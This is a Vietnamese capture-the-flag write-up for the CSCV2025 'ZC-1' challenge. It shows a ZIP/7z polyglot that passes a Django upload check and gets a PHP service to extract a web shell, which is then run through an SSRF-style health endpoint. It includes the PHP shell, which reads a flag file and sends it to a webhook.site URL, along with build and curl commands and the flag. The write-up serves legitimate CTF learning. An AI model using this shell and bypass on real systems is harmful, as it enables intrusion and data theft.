---
title: ZC-1 CHALLENGE

---

# ZC-1 CHALLENGE
# MTA_SUPPORT

![image](https://hackmd.io/_uploads/ry_nOA4Cxl.png)
challenge file: [public](https://drive.google.com/file/d/1PprDuWV1u11dnH1mf_Bc70La8CpFZ7NR/view)

### IDEA: Polyglot ZIP→7z + kích hoạt qua “health” nội bộ
Mục tiêu: Upload 1 file vượt qua kiểm tra `ZIP safety` của `service 1` nhưng buộc `service 2` giải nén và chạy shell.php, rồi dùng endpoint health để gọi file này để lấy flag CSCV2025{}.

Main idea: Tạo polyglot: nhìn như zip hợp lệ với zipfile (Service 1), nhưng lại được 7-Zip (Service 2) đọc như 7z để giải nén shell.php.

Trigger:` GET /gateway/health?module=<path>` trên Service 1 sẽ gọi nội bộ đến `http://app2<module>` (kiểu SSRF nhẹ).

Kết quả: shell.php đi vào folder web served của app2 (**root** `/var/www/html/storage/<user_id>/shell.php`), ta kích hoạt qua health và nhận flag.
    
### Phân tích challenge
- Service-1 (app1, Django) — có cổng http://localhost:8000

- Endpoint:

  - `POST /gateway/user/` **(đăng ký)**

  - `POST /auth/token/` **(JWT)**

  - `POST /gateway/transport/` **(upload)** → xác thực ZIP bằng Python's zipfile 

  - `GET /gateway/health?module=...` → gọi nội bộ http://app2{module}, trả “OK/ERR”

- Service 2 (app2, PHP + Apache) — không lộ cổng ra ngoài

  - Giải nén bằng Archive7z (wrapper gọi 7z) vào /var/www/html/storage/<user_id>/

Note: `zipfile` (Service 1) đọc từ cuối file (central directory) → thấy ZIP “sạch”; `7z` (Service 2) nhận **header 7z** ở đầu → giải nén `shell.php`. Đây là xung đột parser cho phép **polyglot** qua cửa.

### Trình tự khai thác
* Tạo polyglot: ZIP (benign) + 7z payload chứa `shell.php`.
* Lấy JWT để upload/health.
* Upload polyglot qua `POST /gateway/transport/` (Service 1 chấp nhận).
* Service 2 dùng 7-Zip giải nén, thả `shell.php` vào thư mục phục vụ web.
* Lấy `user_id` từ payload JWT.
* Gọi `GET /gateway/health?module=/storage/<user_id>/shell.php`.
* Lấy flag.

## Khai thác
### Khởi chạy docker
```
docker compose up -d
app1: http://localhost:8000
```

### Tạo polyglot ZIP→7z
- Tạo web shell PHP, lưu thành `shell.php`
```
<?php
$flag = @file_get_contents('/flag.txt');
@file_get_contents('https://webhook.site/YOUR-UNIQUE-ID?f='.urlencode($flag));
header('Content-Type: text/plain');
echo $flag ?: "no-flag";
```

### Tạo payload 7z chứa `shell.php`

`7z a -t7z payload.7z shell.php`

### Tạo carrier.zip “hợp lệ” (chứa file hợp lệ theo bộ lọc ALLOW_STORAGE_FILE)
```
echo benign > benign.txt
zip carrier.zip benign.txt
```

### Gộp thành polyglot

```
truepolyglot zipany --payload1file payload.7z --zipfile carrier.zip polyglot.zip
```

### Lấy JWT và user_id

Đăng ký
```
curl -s http://localhost:8000/gateway/user/ -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"msec","password":"msec","email":"abc@gmail.com"}'
```

Lấy token
```
TOKENS=$(curl -s http://localhost:8000/auth/token/ -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"msec","password":"msec"}')
ACCESS=$(echo "$TOKENS" | python3 -c 'import sys,json; print(json.load(sys.stdin)["access"])')
echo "$ACCESS"
```

JWT:
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzYxMDU0MTE1LCJpYXQiOjE3NjEwNTM4MTUsImp0aSI6IjQ4YzE4YmRmYzgwNTRlNGU4N2ZmMDFiNzdjZTU0YmI1IiwidXNlcl9pZCI6IjBjZjQ1MzJhLWI1MGYtNDcxZi05NWE4LTJjZmIxMzEyMTgxNCJ9.mmsJLg7LvRLVb1tRxwOQRXNFs0_94m3QXzsSNWH7BAo

Sau khi lấy được JWT thì truy cập vào [cyberchef](https://gchq.github.io/CyberChef/) để base64 JWT để lấy user_id
![image](https://hackmd.io/_uploads/SJjeT-BRgx.png)

`user_id: 0cf4532a-b50f-471f-95a8-2cfb13121814`

### Upload polyglot
```
curl -s http://localhost:8000/gateway/transport/ \
  -X POST \
  -H "Authorization: Bearer <JWT>" \
  -F "file=@polyglot.zip"
```
![image](https://hackmd.io/_uploads/S1ltTbrRgg.png)

Nếu hiện "OK" tức là đã upload thành công
### Xác định vị trí file
Vào app2:
```
docker compose exec app2 bash
cd /var/www/html
find / -type f -name shell.php 2>/dev/null | head
```
![image](https://hackmd.io/_uploads/SJYna-HAge.png)

- Tiếp theo, tìm xem có thư mực `storage/<user_id>` và có file `shell.php` không
- Dùng lệnh `ls -la` để liệt kê ra các **file/folder** đang có
![image](https://hackmd.io/_uploads/ry9GAZBCle.png)

- Ta thấy có folder `storage`
- Sau đó, dùng lệnh `ls -la /var/www/html/storage || true` để xem folder storage có user_id của tài khoản không
![image](https://hackmd.io/_uploads/Sy5nAZS0gg.png)
- Ta thấy có folder `0cf4532a-b50f-471f-95a8-2cfb13121814` (`user_id` của tài khoản với `username=msec`)
- Tiếp tục truy cập tới `/var/www/html/storage/0cf4532a-b50f-471f-95a8-2cfb13121814`
![image](https://hackmd.io/_uploads/Bke_kGHAgl.png)

  Đã thấy được file shell.php
  
 - Gọi tới nội bộ xem web server có serve được không bằng cách:
  `curl -i http://localhost/storage/user_id/shell.php` (ở đây **user_id** = `0cf4532a-b50f-471f-95a8-2cfb13121814`)
 ![image](https://hackmd.io/_uploads/Hy4llMBAgx.png)

  - Ta đã thấy được flag CSCV2025{}



**FLAG: CSCV2025{Z1p_z1P_21p_Ca7_c47_c@t__}**